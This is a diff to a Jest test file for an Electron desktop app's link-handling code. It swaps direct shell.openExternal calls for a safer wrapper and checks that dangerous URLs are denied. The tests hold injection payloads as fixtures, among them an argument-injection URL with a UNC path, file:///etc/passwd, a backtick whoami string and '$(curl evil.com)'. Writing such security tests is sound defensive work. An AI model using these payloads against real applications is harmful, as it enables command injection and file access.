@@ -3,7 +3,7 @@
 
 'use strict';
 
-import {BrowserWindow, shell} from 'electron';
+import {BrowserWindow} from 'electron';
 
 import MessageModal from 'app/mainWindow/modals/messageModal';
 import NavigationManager from 'app/navigationManager';
@@ -11,18 +11,16 @@ import WebContentsManager from 'app/views/webContentsManager';
 import {getLevel} from 'common/log';
 import ContextMenu from 'main/contextMenu';
 import LocalNetworkAccessManager from 'main/security/localNetworkAccess';
+import {openExternalSafely} from 'main/utils';
 
 import PluginsPopUpsManager from './pluginsPopUps';
 import {WebContentsEventManager} from './webContentEvents';
-import {generateHandleConsoleMessage} from './webContentEventsCommon';
+import {generateHandleConsoleMessage, showInvalidLinkModal} from './webContentEventsCommon';
 
 import allowProtocolDialog from '../../main/security/allowProtocolDialog';
 
 jest.mock('electron', () => ({
     app: {},
-    shell: {
-        openExternal: jest.fn(),
-    },
     BrowserWindow: jest.fn(),
     session: {},
 }));
@@ -58,6 +56,7 @@ jest.mock('main/security/localNetworkAccess', () => ({
 
 jest.mock('main/utils', () => ({
     composeUserAgent: jest.fn(),
+    openExternalSafely: jest.fn(),
 }));
 
 jest.mock('common/config', () => ({
@@ -280,13 +279,20 @@ describe('main/views/webContentsEvents', () => {
 
         it('should open URLs with non-standard characters externally', () => {
             expect(newWindow({url: 'https://google.com/?^'})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith('https://google.com/?^');
+            expect(openExternalSafely).toBeCalledWith('https://google.com/?^', showInvalidLinkModal);
         });
 
         it('should open MS Teams URLs with curly braces in query string', () => {
             const teamsUrl = 'https://teams.microsoft.com/l/message/19:meeting_abc@thread.v2/123?context={%22contextType%22:%22chat%22}';
             expect(newWindow({url: teamsUrl})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith(teamsUrl);
+            expect(openExternalSafely).toBeCalledWith(teamsUrl, showInvalidLinkModal);
+        });
+
+        it('should deny and show dialog when the URL cannot be opened externally', () => {
+            openExternalSafely.mockImplementationOnce((url, onError) => onError(new Error('Invalid URL')));
+            expect(newWindow({url: 'https://example.com}'})).toStrictEqual({action: 'deny'});
+            expect(openExternalSafely).toBeCalledWith('https://example.com}/', showInvalidLinkModal);
+            expect(MessageModal.showErrorModal).toHaveBeenCalled();
         });
 
         it('should allow dev tools to open', () => {
@@ -307,7 +313,7 @@ describe('main/views/webContentsEvents', () => {
             it('should sanitize argument injection before passing to protocol dialog', () => {
                 const maliciousUrl = String.raw`customproto:///" --data-dir "\\deans-mbp\mattermost`;
                 expect(newWindow({url: maliciousUrl})).toStrictEqual({action: 'deny'});
-                expect(shell.openExternal).not.toBeCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(maliciousUrl, undefined);
             });
 
@@ -315,35 +321,35 @@ describe('main/views/webContentsEvents', () => {
                 const uncPath = String.raw`\\server\share\file.exe`;
                 expect(newWindow({url: uncPath})).toStrictEqual({action: 'deny'});
                 expect(MessageModal.showErrorModal).toHaveBeenCalled();
-                expect(shell.openExternal).not.toBeCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
             });
 
             it('should route file: protocol through confirmation dialog', () => {
                 const url = 'file:///etc/passwd';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(shell.openExternal).not.toBeCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should reject URLs with literal null bytes and show dialog', () => {
                 expect(newWindow({url: 'customproto:///path\x00malicious'})).toStrictEqual({action: 'deny'});
                 expect(MessageModal.showErrorModal).toHaveBeenCalled();
-                expect(shell.openExternal).not.toBeCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
             });
 
             it('should reject URLs with percent-encoded null bytes and show dialog', () => {
                 expect(newWindow({url: 'customproto:///path%00malicious'})).toStrictEqual({action: 'deny'});
                 expect(MessageModal.showErrorModal).toHaveBeenCalled();
-                expect(shell.openExternal).not.toBeCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
             });
 
             it('should reject completely malformed URIs with no scheme and show dialog', () => {
                 expect(newWindow({url: 'not-a-url-at-all'})).toStrictEqual({action: 'deny'});
                 expect(MessageModal.showErrorModal).toHaveBeenCalled();
-                expect(shell.openExternal).not.toBeCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
             });
 
@@ -351,7 +357,7 @@ describe('main/views/webContentsEvents', () => {
                 const oversizedURL = `http://example.com/${'A'.repeat(1000000)}`;
                 expect(newWindow({url: oversizedURL})).toStrictEqual({action: 'deny'});
                 expect(MessageModal.showErrorModal).toHaveBeenCalled();
-                expect(shell.openExternal).not.toBeCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
             });
         });
@@ -360,21 +366,21 @@ describe('main/views/webContentsEvents', () => {
             it('should percent-encode backticks', () => {
                 const url = 'customproto:///path/`whoami`';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(shell.openExternal).not.toBeCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should encode spaces in $() shell expansion patterns', () => {
                 const url = 'customproto:///$(curl evil.com)';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(shell.openExternal).not.toBeCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should preserve double-encoded values without double-decoding', () => {
                 const url = 'customproto:///path%2520with%2520spaces';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(shell.openExternal).not.toBeCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
         });
@@ -422,17 +428,17 @@ describe('main/views/webContentsEvents', () => {
         it('should open in the browser when there is no server matching', () => {
             WebContentsManager.getViewByWebContentsId.mockReturnValue(undefined);
             expect(newWindow({url: 'http://server-2.com/subpath'})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith('http://server-2.com/subpath');
+            expect(openExternalSafely).toBeCalledWith('http://server-2.com/subpath', showInvalidLinkModal);
         });
 
         it('should open public file links in browser', () => {
             expect(newWindow({url: 'http://server-1.com/api/v4/public/files/myfile.img'})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith('http://server-1.com/api/v4/public/files/myfile.img');
+            expect(openExternalSafely).toBeCalledWith('http://server-1.com/api/v4/public/files/myfile.img', showInvalidLinkModal);
         });
 
         it('should open help links in the browser', () => {
             expect(newWindow({url: 'http://server-1.com/help/helplink'})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith('http://server-1.com/help/helplink');
+            expect(openExternalSafely).toBeCalledWith('http://server-1.com/help/helplink', showInvalidLinkModal);
         });
 
         it('should open team links in the app', () => {
@@ -462,7 +468,7 @@ describe('main/views/webContentsEvents', () => {
 
         it('should open external URIs in browser', () => {
             expect(newWindow({url: 'https://google.com'})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith('https://google.com/');
+            expect(openExternalSafely).toBeCalledWith('https://google.com/', showInvalidLinkModal);
         });
 
         it('should dispose context menu when popup window closes', () => {
